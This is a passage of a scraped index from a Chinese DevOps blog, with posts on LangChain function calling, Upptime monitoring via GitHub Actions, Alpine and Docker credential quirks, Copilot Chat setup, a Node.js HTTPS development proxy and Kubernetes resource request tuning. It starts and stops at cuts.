\u0026#34;pod3\u0026#34;] manual_input:获取 c1 这个集群的全部节点 function_bot: [\u0026#34;node1\u0026#34;, \u0026#34;node2\u0026#34;, \u0026#34;node3\u0026#34;] 输入自然语言，自动执行函数，并返回结果。这里举了两个例子，一个是获取 default 命名空间下全部 Pod，一个是获取 c1 集群下全部节点。\n2.2 代码实现 设置环境变量 1 2 export OPENAI_API_BASE=\u0026#34;https://api.openai.com/v1\u0026#34; export OPENAI_API_KEY=\u0026#34;xxx\u0026#34; 在使用 OpenAI API 时，会自动读取环境变量中设置的 API KEY。\n完整代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 # -*- coding: utf-8 -*- import json from typing import Type from pydantic import BaseModel, Field, create_model from typing import Optional from langchain.tools import BaseTool from langchain.callbacks.manager import ( AsyncCallbackManagerForToolRun, CallbackManagerForToolRun, ) from langchain.tools import format_tool_to_openai_function import openai class GetClusterNodes(BaseTool): name: str = \u0026#34;get_cluster_nodes\u0026#34; description: str = \u0026#34;get all nodes in kubernetes cluster\u0026#34; args_schema: Type[BaseModel] = create_model( \u0026#34;GetClusterNodesArgs\u0026#34;, cluster=(str, Field( description=\u0026#34;the cluster of you want to query\u0026#34;, type=\u0026#34;string\u0026#34;)), ) def _run( self, query: str, run_manager: Optional[CallbackManagerForToolRun] = None ) -\u0026gt; str: return json.dumps([\u0026#34;node1\u0026#34;, \u0026#34;node2\u0026#34;, \u0026#34;node3\u0026#34;]) async def _arun( self, query: str, run_manager: Optional[AsyncCallbackManagerForToolRun] = None ) -\u0026gt; str: return json.dumps([\u0026#34;node1\u0026#34;, \u0026#34;node2\u0026#34;, \u0026#34;node3\u0026#34;]) class GetClusterPodsByNamespaces(BaseTool): name: str = \u0026#34;get_cluster_pods_by_namespace\u0026#34; description: str = \u0026#34;get special pods in kubernetes special namespace\u0026#34; args_schema: Type[BaseModel] = create_model( \u0026#34;GetClusterPodsByNamespacesArgs\u0026#34;, namespace=(str, Field( description=\u0026#34;the namespace of you want to query\u0026#34;, type=\u0026#34;string\u0026#34;)), ) def _run( self, query: str, run_manager: Optional[CallbackManagerForToolRun] = None ) -\u0026gt; str: return json.dumps([\u0026#34;pod1\u0026#34;, \u0026#34;pod2\u0026#34;, \u0026#34;pod3\u0026#34;]) async def _arun( self, query: str, run_manager: Optional[AsyncCallbackManagerForToolRun] = None ) -\u0026gt; str: return json.dumps([\u0026#34;pod1\u0026#34;, \u0026#34;pod2\u0026#34;, \u0026#34;pod3\u0026#34;]) functions_list: list = [GetClusterNodes, GetClusterPodsByNamespaces] functions_map: dict = {fun().name: fun for fun in functions_list} def run(msg: str): response = openai.ChatCompletion.create( model=\u0026#34;gpt-3.5-turbo\u0026#34;, messages=[{\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: msg}], functions=[ format_tool_to_openai_function(t()) for t in functions_list], function_call=\u0026#34;auto\u0026#34;, ) message = response[\u0026#34;choices\u0026#34;][0][\u0026#34;message\u0026#34;] if message.get(\u0026#34;function_call\u0026#34;): function_name = message[\u0026#34;function_call\u0026#34;][\u0026#34;name\u0026#34;] function_response = functions_map[function_name]().run( message[\u0026#34;function_call\u0026#34;][\u0026#34;arguments\u0026#34;]) return function_response if __name__ == \u0026#34;__main__\u0026#34;: while True: user_input = input(\u0026#34;manual_input:\u0026#34;) if user_input == \u0026#34;exit\u0026#34;: break print(\u0026#34;function_bot:\u0026#34;, run(user_input)) 这里为了简化实现，_run 都直接进行了返回，没有实际调用函数。在实际生产中，我们需要去根据输入的 query，调用函数，返回结果。\n2.3 逐步解析 核心代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 def run(msg: str): response = openai.ChatCompletion.create( model=\u0026#34;gpt-3.5-turbo\u0026#34;, messages=[{\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: msg}], functions=[ format_tool_to_openai_function(t()) for t in functions_list], function_call=\u0026#34;auto\u0026#34;, ) message = response[\u0026#34;choices\u0026#34;][0][\u0026#34;message\u0026#34;] if message.get(\u0026#34;function_call\u0026#34;): function_name = message[\u0026#34;function_call\u0026#34;][\u0026#34;name\u0026#34;] function_response = functions_map[function_name]().run( message[\u0026#34;function_call\u0026#34;][\u0026#34;arguments\u0026#34;]) return function_response 在 openai.ChatCompletion.create 设置两个参数:\nfunction_call 设置为 auto，默认即 auto，由模型自己决定是否调用函数。这里并不是真的调用，而是返回一些函数元信息。\nfunctions 是一个列表对象，OpenAI 根据传入的函数描述加用户输入的内容 msg 做出判断，返回函数的名字、获取到的参数。\n自定义函数 有两种写法的定义: 一种是直接使用列表对象拼接，一种是继承 BaseTool 实现。\n下面是列表对象拼接:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [ { \u0026#34;name\u0026#34;: \u0026#34;get_cluster_nodes\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;get all nodes in kubernetes cluster\u0026#34;, }, { \u0026#34;name\u0026#34;: \u0026#34;get_cluster_pods_by_namespace\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;get special pods in kubernetes special namespace\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;namespace\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;filter pods in namespace\u0026#34;, } }, \u0026#34;required\u0026#34;: [\u0026#34;namespace\u0026#34;], }, } ] 上面的完整示例代码中使用的就是继承 BaseTool 实现:\n1 2 class GetClusterNodes(BaseTool): class GetClusterPodsByNamespaces(BaseTool): 继承 BaseTool 的方式其实最终还是需要使用 format_tool_to_openai_function 提取自定义函数中的信息生成一个列表，但使用 BaseTool 管理函数方法是一个更加清晰的方式。\n函数参数定义非常重要 如果不详细描述参数，那么 OpenAI 识别到的参数格式很有可能是这样的:\n1 2 3 4 \u0026#34;function_call\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_cluster_nodes\u0026#34;, \u0026#34;arguments\u0026#34;: \u0026#34;{\\n\\\u0026#34;__arg1\\\u0026#34;: \\\u0026#34;c1\\\u0026#34;\\n}\u0026#34; } 而如果设置了 properties 或者 args_schema 之后，OpenAI 返回的函数参数就非常符合预期了。\n1 2 3 4 \u0026#34;function_call\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_cluster_nodes\u0026#34;, \u0026#34;arguments\u0026#34;: \u0026#34;{\\n\\\u0026#34;cluster\\\u0026#34;: \\\u0026#34;c1\\\u0026#34;\\n}\u0026#34; } 哪里实现具体业务逻辑 如果使用直接拼接列表的形式，那么直接写在函数即可。如果继承 BaseTool，那么就需要实现其同步调用 _run 函数， 异步调用 _arun 函数。\n上面的完整示例代码中:\n1 2 function_response = functions_map[function_name]().run( message[\u0026#34;function_call\u0026#34;][\u0026#34;arguments\u0026#34;]) 直接将返回的参数，传给被调用的函数，这里调用的就是 _run 函数。在 _run 函数中，通过 json.loads(query) 可以获取到符合 args_schema 定义的参数。\n[可选]通过 OpenAI 再次整理消息响应 1 2 3 4 5 6 7 8 9 10 11 12 def format(msg: str, function_response: str): return openai.ChatCompletion.create( model=\u0026#34;gpt-3.5-turbo\u0026#34;, messages=[ {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: msg}, { \u0026#34;role\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;get_cluster_nodes\u0026#34;, \u0026#34;content\u0026#34;: function_response, }, ], )[\u0026#34;choices\u0026#34;][0][\u0026#34;message\u0026#34;][\u0026#34;content\u0026#34;] 代码如上，在获取到函数的响应之后，如果还需要对响应的格式、内容进行二次整理，可以设置一个 function 角色的消息，附加上函数的响应，加上用户的输入，一起发送给 OpenAI。此时，OpenAI 会给出一个更加完整的响应。\n但这步不是必须，如果函数的响应已经符合预期，那么可以直接返回。\n3. 总结 本篇主要是借助 OpenAI 和 Langchain 实现了一个直接使用自然语言调用函数的示例。\n大模型不仅仅可以用来聊天，还可以用来触发一些业务逻辑。在我们开发 Copilot 时，经常需要这种胶水功能，粘合大模型和业务逻辑。\n大模型生态的建设有两部分，一个是认知，一个是执行。认知依赖于大模型的参数规模、网络结构、训练数据；执行主要依赖于外部连接的情况。\n我认为，即使参与不了大模型的训练，也可以尝试着整理一下行业知识库，还有机会参与到执行部分。围绕执行我们可以将产品的 API 开放出来，增加大模型连接系统的触点；还可以开发一些 SDK、工具包，帮助开发者快速接入大模型，比如整理一个 BaseTool 类库，封装各种 API 、脚本功能；当然，还可以根据大模型的思考方式，重新设计业务流程、执行逻辑。\n","description":"","id":104,"section":"post","tags":["博文","OpenAI","Langchain","AI","集成"],"title":"使用 OpenAI 和 Langchain 通过对话直接调用函数","uri":"https://www.chenshaowen.com/blog/call-functions-through-dialogue-using-openai-and-langchain.html"},{"content":"1. 什么需要拨测服务 今年 GPT 大火，我也部署、开发了几个应用、小程序进行学习。当然，秉承帮助厂商测试功能的原则，目前只有 GPT 3.5 的 API 每天有少许费用，服务器、数据库、带宽都是免费的。\n为了节省成本，我没有测试环境，每次提交代码，只要能编译成功就会直接发布到正式环境。Golang 的应用还好点，编译成功就问题不大；Python 的应用就坑爹了，没有单元测试就很容易出错，提交之后就是 500 。因此，迫切需要监控服务是否异常，保障其可用性。\n拨测就是利用分布于全网的监测点，周期性的监控指定服务的可用性、响应延时等。这正是我所需的功能。\n2. 为什么是 Upptime 国内厂商提供的免费额度都太小。免费额度最多的阿里云拨测也只够一个监测点每隔 5 分钟监控一个服务地址。\n看到有些独立网站使用的 uptime-kuma 项目，是一个 GitHub 开源项目 https://github.com/louislam/uptime-kuma 。最终的监控效果挺好，展示非常清晰、还支持各种告警通知渠道。但，部署 uptime-kuma 时，需要挂载本地盘或者使用 MySQL 存储数据。对于，没有购买服务器的同学来说，成本就略高了。\n此时 Upptime 这个项目进入候选名单。Upptime 也是一个 GitHub 开源项目 https://github.com/upptime/upptime 。Upptime 的实现方式是使用 GitHub Actions 定时执行脚本，将监测结果存储在 GitHub 的仓库中，将告警通过 Issues 的方式提交和管理。这就不需要额外的服务器或者数据存储了，与我之前开发的 https://github.com/shaowenchen/debugger-action 项目，利用 GitHub Actions 资源免费运行 6 小时的 Kubernetes 集群类似。\n利用 GitHub Actions 提供计算资源，使用 GitHub Repository、Issues 存储数据，这样的实现方式，对于使用者来说，成本为零。只要不滥用，比如用于挖矿、高频率使用、大规模的数据存储等，不会被 GitHub 封禁账号。\n3. 使用 Upptime 搭建拨测服务 3.1 以 Upptime 项目为模板创建新仓库 打开项目 https://github.com/upptime/upptime\n点击 [Use this template] 选择 [Create a new repository]\n勾选全部分支 [Include all branches]，输出仓库名称 点击创建，等待完成 3.2 配置更新仓库的凭证 创建一个新的 Personal access tokens，用于更新仓库 打开页面 https://github.com/settings/tokens/new\n勾选 [repo] [workflow] 权限，点击 [Generate token] 生成新的 token，如下图:\n在刚才创建的仓库中，设置 Secrets 以我创建的 shaowenchen/upptime 为例，进入 https://github.com/shaowenchen/upptime/settings/secrets/actions\n点击 [New repository secret] 添加一个名字为 GH_PAT 的 secret，值为刚才创建的 Personal access tokens, 如下图:\n3.3 修改配置文件，添加监测服务 Upptime 项目的配置文件是 .upptimerc.yml，在仓库的根目录下。以下说明几个关键的配置，其他配置项可以参考 https://upptime.js.org/docs/configuration\n设置仓库的 owner 和 repo 1 2 owner: shaowenchen repo: upptime 设置仓库的 CNAME，用于自定义域名 Upptime 项目默认使用 https://\u0026lt;owner\u0026gt;.github.io/\u0026lt;repo\u0026gt; 的域名，如果需要自定义域名，可以设置 CNAME，如下所示。\n1 2 3 4 status-website: cname: upptime.chenshaowen.com logoUrl: https://www.chenshaowen.com/logo.png name: Upptime 设置监测的服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 sites: - name: www.chenshaowen.com url: https://www.chenshaowen.com maxResponseTime: 1000 - name: chatgpt.chenshaowen.com url: https://chatgpt.chenshaowen.com expectedStatusCodes: - 200 - name: Google DNS 1 check: \u0026#34;tcp-ping\u0026#34; url: 8.8.4.4 port: 53 - name: www url: $WWW_URL 这里的 maxResponseTime 是设置响应时间的阈值，如果超过这个阈值，就会触发告警。expectedStatusCodes 是设置期望的响应状态码，如果不是期望的状态码，也会触发告警。\n上面有两个比较特殊的配置:\n\u0026ldquo;tcp-ping\u0026rdquo; 定义的是一个 tcp 的监测服务，用于监测端口是否可用 $WWW_URL 用于从环境变量中获取监测服务的地址，用来隐藏服务地址 在配置 GitHub Actions 时，在 .github/workflows/uptime.yml 中有一个有趣的写法:\n1 2 3 env: GH_PAT: ${{ secrets.GH_PAT || github.token }} SECRETS_CONTEXT: ${{ toJson(secrets) }} SECRETS_CONTEXT 是一个环境变量，用于将所有的 secrets 中定义的变量直接都放到当前环境变量中。\n因此在上面的配置示例中，我们只需要在 secrets 中定义一个 WWW_URL 的变量，就可以在配置文件中使用 $WWW_URL 来引用这个变量了，非常方便。\n4. 配置告警通知 Upptime 的告警配置可以参考 https://upptime.js.org/docs/notifications ，这里我主要以 SendGrid 邮件告警为例，说明如何配置。\n4.1 创建一个 SendGrid Sender Authentication 点击进入 https://app.sendgrid.com/settings/sender_auth ，选择 [Single Sender Verification]，点击 [Create Sender]，输入一组信息验证邮件地址，如下图:\n4.2 创建 SendGrid API Key 点击进入 https://app.sendgrid.com/settings/api_keys ，选择 [Create API Key]，输入一个名字，选择 [Full Access]，点击 [Create \u0026amp; View]，如下图:\n4.3 在 GitHub Secrets 中配置 SendGrid 相关参数 邮件必须设置的参数有:\n1 2 3 NOTIFICATION_EMAIL=true NOTIFICATION_EMAIL_FROM=\u0026#34;上面 SendGrid 创建的邮箱地址\u0026#34; NOTIFICATION_EMAIL_TO=\u0026#34;你的告警收件邮箱\u0026#34; 1 2 NOTIFICATION_EMAIL_SENDGRID=true NOTIFICATION_EMAIL_SENDGRID_API_KEY=\u0026#34;上面创建的 SendGrid API Key\u0026#34; 5. 验收与总结 5.1 验收 打开网站 https://upptime.chenshaowen.com/ 就可以看到监测的结果了，如下图:\n点击监控项可以查看历史记录，如下图:\n当触发告警时，会创建一个 issue，如下图:\n当告警恢复时，会自动关闭 issue。当然，也能收到告警触发、恢复的邮件通知，如下图:\n5.2 总结 本篇文章主要介绍了如何使用 Upptime 来监测网站的可用性，以及如何配置告警通知。Upptime 项目的配置非常简单，而且提供了很多的监测方式，可以满足大部分的监测需求。\n但使用 GitHub Actions 来运行 Upptime 项目，可能存在滥用的风险，如果自己有服务器，可以接入到 GitHub Actions 作为 Self-hosted runner，是一个更好的选择。同时，Self-hosted runner 作为自定义检测点，可以在更接近用户的地方提供检测，具有更佳的准确性。\n","description":"","id":105,"section":"post","tags":["博文","GitHub","Actions","监控","拨测"],"title":"使用 Upptime 无成本监控服务可用性","uri":"https://www.chenshaowen.com/blog/monitor-service-accessibility-with-upptime-for-free.html"},{"content":"1. DNS 请求超时 原因: alpine 使用的是 musl 库，在 DNS 解析上会有一些限制[1]\n解决方式：\n不使用 apline 镜像，并在容器 resolv.conf 文件中增加 options single-request-reopen 配置。因为 single-request-reopen 配置项只对 glibc 库生效，但是 apline 镜像使用的是 musl 库\n2. Docker 下无法解析 hosts 原因:\nalpine 没有 /etc/nsswitch.conf，导致依赖 hosts 的进程无法解析 hosts。\n解决方式：\n在 Dockerfile 中添加如下命令：\n1 RUN if [ ! -e /etc/nsswitch.conf ];then echo \u0026#39;hosts: files dns\u0026#39; \u0026gt; /etc/nsswitch.conf; fi 3. 参考 https://wiki.musl-libc.org/functional-differences-from-glibc.html#Name-Resolver/DNS ","description":"","id":106,"section":"post","tags":["博文","镜像","问题"],"title":"使用 Apline 镜像常见问题","uri":"https://www.chenshaowen.com/blog/common-problems-using-apline.html"},{"content":" 在 client 中已经看到 Docker CLI 在给 Docker Daemon 发生构建上下文时，通过设置 X-Registry-Config 传递凭证，但在最近的构建反馈中，还是会出现一些无法解释的现象，本篇主要是进行一些基础的测试，以便于更好排查问题。\n1. 宿主机 Docker 下构建 Docker Daemon 以 root 用户权限启动。\n未登录任何账户 1 2 3 4 su ansible echo \u0026#34;FROM harbor.chenshaowen.com/private/test:v1\u0026#34; | sudo docker build - -t harbor.chenshaowen.com/private/test:v2 --pull unauthorized 凭证已被清空。\nansible 用户登录，root 用户不登录 此时需要注意，不能使用 sudo docker login 登录，而是应该直接将凭证放在 /home/ansible/.docker/config.json 中。\n1 2 3 4 su ansible echo \u0026#34;FROM harbor.chenshaowen.com/private/test:v1\u0026#34; | sudo docker build - -t harbor.chenshaowen.com/private/test:v2 --pull unauthorized 1 2 3 4 su ansible echo \u0026#34;FROM harbor.chenshaowen.com/private/test:v1\u0026#34; | sudo docker build - -t harbor.chenshaowen.com/private/test:v2 --push unauthorized ansible 用户不登录，root 用户登录 1 2 3 4 su ansible echo \u0026#34;FROM harbor.chenshaowen.com/private/test:v1\u0026#34; | sudo docker build - -t harbor.chenshaowen.com/private/test:v2 --pull OK 使用 sudo 构建时，当前用户配置的凭证不会生效，而是使用 sudo 用户的凭证。\n2. Docker out of Docker 下构建 为了模拟构建环境，在宿主机上以 root 用户权限，启动一个 Docker 容器，用来进行测试。\n1 docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker:19.03 sh 容器不登录，宿主机不登录 1 2 3 echo \u0026#34;FROM harbor.chenshaowen.com/private/test:v1\u0026#34; | docker build - -t harbor.chenshaowen.com/private/test:v2 --pull unauthorized 凭证已被清空。\n容器登录，宿主机不登录 1 2 3 echo \u0026#34;FROM harbor.chenshaowen.com/private/test:v1\u0026#34; | docker build - -t harbor.chenshaowen.com/private/test:v2 --pull OK 1 2 3 docker push harbor.chenshaowen.com/private/test:v2 OK 容器不登录，宿主机登录 1 2 3 echo \u0026#34;FROM harbor.chenshaowen.com/private/test:v1\u0026#34; | docker build - -t harbor.chenshaowen.com/private/test:v2 --pull unauthorized 1 2 3 docker push harbor.chenshaowen.com/private/test:v2 unauthorized 都登录，但容器权限不够，主机权限够 1 2 3 echo \u0026#34;FROM harbor.chenshaowen.com/private/test:v1\u0026#34; | docker build - -t harbor.chenshaowen.com/private/test:v2 --pull unauthorized 1 2 3 docker push harbor.chenshaowen.com/private/test:v2 unauthorized 在 Docker out of Docker 模式下，构建的凭证与宿主机无关，而是使用的容器中提供的凭证。\n3. Kubernetes 下执行流水线任务 提供 imagePullSecrets，Docker 不配置凭证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: a2 spec: replicas: 1 selector: matchLabels: app: demo template: metadata: labels: app: demo spec: containers: - name: demo command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo \u0026#34;Hello, wwww.chenshaowen.com !\u0026#34; \u0026amp;\u0026amp; sleep 3600\u0026#39;] image: harbor.chenshaowen.com/private/test:v1 imagePullPolicy: Always imagePullSecrets: - name: pull-harbor-secret EOF 1 OK 不提供 imagePullSecrets，Docker 配置凭证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: a2 spec: replicas: 1 selector: matchLabels: app: demo template: metadata: labels: app: demo spec: containers: - name: demo command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo \u0026#34;Hello, wwww.chenshaowen.com !\u0026#34; \u0026amp;\u0026amp; sleep 3600\u0026#39;] image: harbor.chenshaowen.com/private/test:v1 imagePullPolicy: Always EOF 1 unauthorized Kubernetes Pod 镜像拉取也与 Docker 凭证配置没有关系。\n4. 总结 本篇的测试并没有带来奇怪的知识，只是为了验证理解是否正确，结论如下:\n使用 sudo 构建时，当前用户配置的凭证不会生效，而是使用 sudo 用户的凭证 在 Docker out of Docker 模式下，构建的凭证与宿主机无关，而是使用容器中提供的凭证 Kubernetes Pod 拉取镜像也不会使用宿主机上配置的凭证，如果你认为有使用，可能是镜像已经在宿主机上，并且拉取模式是 IfNotPresent ","description":"","id":107,"section":"post","tags":["博文","CICD","DevOps","凭证","Kubernetes"],"title":"流水线构建时，凭证作用域问题","uri":"https://www.chenshaowen.com/blog/the-scope-of-credential-in-building.html"},{"content":"1. 申请使用 GitHub Copilot Chat 申请链接 https://github.com/github-copilot/chat_waitlist_signup/join\n申请通过之后，会收到一封邮件:\n2. 什么是 VS Code insiders 什么是 VS Code insiders VS Code insiders 是 VS Code 的预览版本，提供一些最新的功能和改进，更新非常频繁。如果有更新强迫症，慎重使用，因为几乎每天都有更新。\nVS Code 和 VS Code insiders 的区别 VS Code 的命令行是 code ，logo 是这样\nVS Code insiders 的命令行是 code-insiders ，logo 是这样\nVS Code 与 VS Code insiders 是否可以共存 可以共存，他们的命令行不同，Settings Sync 同步的配置也可以不同。\n3. 安装 VS Code insiders 前往 https://code.visualstudio.com/insiders/ 下载最新的 code-insiders\n查看 code-insiders 命令路径 1 2 3 which code-insiders /usr/local/bin/code-insiders 【可选】创建软连接，替代 VS Code 命令 1 ln -s /usr/local/bin/code-insiders /usr/local/bin/code 安装 GitHub Copilot Chat 查看 GitHub Copilot Nightly 已经 deprecated 不维护了。在 Extensions 中搜索 Copilot Chat，安装插件，如下图:\n4. 使用 Copilot Chat 4.1 直接在 Chat 面板中聊天 类似 ChatGPT，但是 Copilot Chat 内置在 VS Code 中，不用切换到浏览器。\n4.2 提供上下文，调用 Copilot 指令 在编辑器中选中一段代码，作为上下文，在对话框中输入 / 会有指令提示。\n1 2 3 4 /explain 解释代码 /fix 代码修复 /tests 生成单元测试 /clear 清空对话 下图是生成单元测试的一个示例:\n点击对话框的图示按钮，可以直接将 Copilot 生成的代码应用于项目。\n4.3 提供上下文，右键菜单调用 Copilot 指令 在编辑器中，选中一段代码，右键菜单中会有 Copilot 指令。\n此时与输入 Copilot 指令的效果一样。\n在 Copilot 产生了变更之后，会出现代码 Merge 的对话框，可以选择是否应用变更。\n5. 总结 本篇主要是介绍了如何在 VS Code 中使用 Copilot Chat。\nCopilot 的这种形式，正在颠覆以往的产品形态。以往的产品和工具，往往只能提供信息或者执行动作，使用 Copilot 这种整合信息和执行的方式，可以真切地感受到效率的提升。\nCopilot Chat 应该只能算是 Copilot 的一个前端应用，后端其实需要很多的数据、功能支撑。\n","description":"","id":108,"section":"post","tags":["博文","Copilot","GitHub","Chat","AI"],"title":"GitHub Copilot Chat 使用","uri":"https://www.chenshaowen.com/blog/the-practice-of-github-copilot-chat.html"},{"content":"1. 背景 微服务架构下，服务与服务的依赖关系复杂。在开发过程中，多个服务之间经常需要联调。此时有两种方式:\n将服务部署到线上开发环境 Kubernetes 集群 使用 telepresence 打通本地与线上集群的通信，这样能获得一个比较稳定的联调环境。\n缺点是，需要生成足够权限的凭证、需要研发人员熟悉 Kubernetes 的使用。每人一套成本又比较高。\n直接在办公网开发机之间互相调用 内网是互通的，直接调用也是可行的。但有些服务依赖是写死 Https 和 域名的，这样就需要在本地搭建一个 Https 代理服务。\n本篇主要是介绍如何使用 Nodejs 搭建一个 Https 代理服务，用于转发依赖的服务请求。\n2. 代理逻辑 如上图，是代理 Https 请求的示意图。主要步骤如下：\n生成 CA 证书\n签发服务域名证书\n配置代理服务\n设备信任 CA 证书\n配置 Hosts 或 DNS 访问\n生成 CA 证书、签发服务域名证书的具体操作，可以参考 Harbor 使用自签证书支持 Https 访问。\n3. 配置代理 安装依赖 1 npm install express http-proxy-middleware 配置 proxy.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 const https = require(\u0026#34;https\u0026#34;); const express = require(\u0026#34;express\u0026#34;); const { createProxyMiddleware } = require(\u0026#34;http-proxy-middleware\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const options = { cert: fs.readFileSync(\u0026#34;www.baidu.com.cert\u0026#34;), key: fs.readFileSync(\u0026#34;www.baidu.com.key\u0026#34;), }; const app = express(); app.use( \u0026#34;/\u0026#34;, createProxyMiddleware({ target: \u0026#34;http://2.2.2.2:8080\u0026#34;, changeOrigin: true, }) ); https.createServer(options, app).listen(443, () =\u0026gt; { console.log(\u0026#34;Proxy server listening on port 443\u0026#34;); }); 启动代理服务 1 node proxy.js 此时，通过配置 Hosts 或 DNS (1.1.1.1 www.baidu.com) 访问 https://www.baidu.com，就能访问到 http://2.2.2.2:8080 服务了。\n指定 target 域名及解析 如果你想 tagert 配置成域名，并且解析也自行指定，那么可以加上 DNS 片段，仅在当前服务生效。\n1 2 3 4 5 6 7 8 9 10 11 12 13 const dns = require(\u0026#34;dns\u0026#34;); const customLookup = (hostname, options, callback) =\u0026gt; { const customIP = \u0026#34;2.2.2.2\u0026#34;; const family = options.family || 4; if (hostname === \u0026#34;target.domain.com\u0026#34;) { const address = family === 6 ? \u0026#34;::1\u0026#34; : customIP; return callback(null, address, family); } dns.lookup(hostname, options, callback); }; dns.lookup = customLookup; ","description":"","id":109,"section":"post","tags":["博文","Nodejs","Proxy","研发"],"title":"使用 Nodejs 代理 Https 请求到依赖的研发服务","uri":"https://www.chenshaowen.com/blog/how-to-set-proxy-to-server-using-nodejs.html"},{"content":"1. 业务背景 当企业达到一定规模时，完全依赖于公有云基础设施，IT 成本会很高。\n采购物理机器的成本可以摊薄到未来 3~5 年，之后机器并不会报废，而是会继续超期服役。私有云需要配比一定运维人员、购买专线带宽、机房费用等，IT 服务达到一定规模才能有效降低成本。\n因此，中大型企业才会采用混合云的方案，将一部分应用部署在公有云，一部分应用部署在私有云。这也促成了托管云服务的发展，云厂商提供纳管私有机器的服务，以便能够快速对接自家的公有云服务。\n如上图，私有云的机器用来满足基本的业务资源需求，公有云的机器用来补充业务高峰期的资源需求。而 Kubernetes 作为基础设施，当然也需要适配混合云的场景。\n如上图，是一个混合云下的 Kubernetes 集群，私有机房（Master + 部分 Worker）+ 公有云（部分 Worker）。采用 Cluster Autoscaler 组件，对接公有云的弹性伸缩组服务，按需扩容或缩容 Worker 节点。\n私有云的机器成本基本是固定的，而公有云的机器成本是按需计费的。在保障业务 SLA 的前提下，尽可能的减少公有云机器的使用，就是我最近在做的事情。\n2. Request 为何如此重要 2.1 有利于调度均衡 Request 是资源的请求量。如上图，当调度器在给 Pod 选择一个合适的 Node 时，Node 上 Pod 的 Request 总和越少，打分越高，越容易被选中。\n如果给每个 Pod 都设置了很低的 Request，你会发现调度非常不均，有些节点负载很高，但调度器还是会选择这些节点。\n因为默认的调度器是静态调度，只看 Request 和 Node 上的 Request 总量，而不考虑实际使量。\nRequest 保障当前应用分配有足够资源，是用来保护自己的；Limit 是用来限制当前应用，是用来保护其他应用的。\n你可以不设置 Limit，但一定要设置 Request。\n2.2 HPA 依赖于 Request 值扩缩容 HPA 计算资源使用率的公式是：\ncurrentUtilization = int32((metricsTotal * 100) / requestsTotal) 当使用率超过阈值时，HPA 会增加 Pod 副本数量。而这里的 Total 意味着，HPA 计算的是全部 Pod 的资源消耗。\n这里有两个问题需要思考\n一个 Pod 可能有多个容器，一个容器使用率 90%，一个容器使用率 10% 在 Kubernetes v1.27 中有一个 Beta 特性 ContainerResource，可以指定容器作为计算对象，而忽略 Sidecar 等其他容器。\n多个 Pod 的资源消耗不一样，一个 Pod 使用率 90%，一个 Pod 使用率 10% 从研发侧，在开发应用时，就应该考虑多副本的均衡性，避免出现单个副本任务过重的情况。如果是长链接导致的不均衡，应该有再平衡机制。同时，还应该支持优雅重启，避免某个 Pod 负载过高被 Kill 之后，影响服务的 SLO。\n从运维侧，可以适当降低 Limit 值，通过 Kill Pod 的方式，让请求分散到其他 Pod 上。\n3. 如何设置 Request 和 Limit 3.1 设置 Request 前面说到 Request 是用来保护当前应用的，应该能够满足应用的基本使用。但 Request 太高，又会导致资源浪费。\nCPU 如上图，Request 应该满足大部分时间段下 CPU 使用。\nclamp_min(max(quantile_over_time(0.6, irate(container_cpu_usage_seconds_total{cluster=\u0026#34;$cluster\u0026#34;, namespace=\u0026#34;$namespace\u0026#34;, deployment=\u0026#34;$deployment\u0026#34;}[2m])[1w:2m])), 0.5) quantile_over_time 函数统计 60 百分位的使用需求，clamp_min 函数设置最小值为 0.5。\nMemory clamp_min(max(quantile_over_time(0.8, max(sum (container_memory_working_set_bytes{cluster=\u0026#34;$cluster\u0026#34;,image!=\u0026#34;\u0026#34;,name=~\u0026#34;^k8s_.*\u0026#34;, namespace=~\u0026#34;$namespace\u0026#34;, deployment=~\u0026#34;$deployment\u0026#34;}) by (pod)))[1w:2m]), 500 * 1024 * 1024) 内存是不可压缩资源，需要设置一个较高的 Request，以保障应用的正常运行。因此，设置的百分位比 CPU 要高。\n3.2 设置 Limit 设置 Limit 是为了保护其他应用，避免当前应用的资源消耗过高时，影响其他应用的正常运行。\nCPU 如下图，应用经常会碰到，CPU 使用率很低，但是 CPU 限流很严重，需要不断地提高 CPU Limit，而过高的 Limit 又会导致节点不稳定。同时，有些计费系统，是以 Limit 为基础进行计费的，过高的 Limit 会增加业务成本。\n这种情况是因为，Prometheus 的采样频率是 15s，监控粒度太粗，采集不到实时的 CPU 使用情况。而如果采集 1s、100ms 监控数据时，很有可能是这样的。\n使用率已经超过 400%。\n在这种情况下，首先得升级内核版本至 5.14 及以上。5.14 内核新增的 CPU Burst 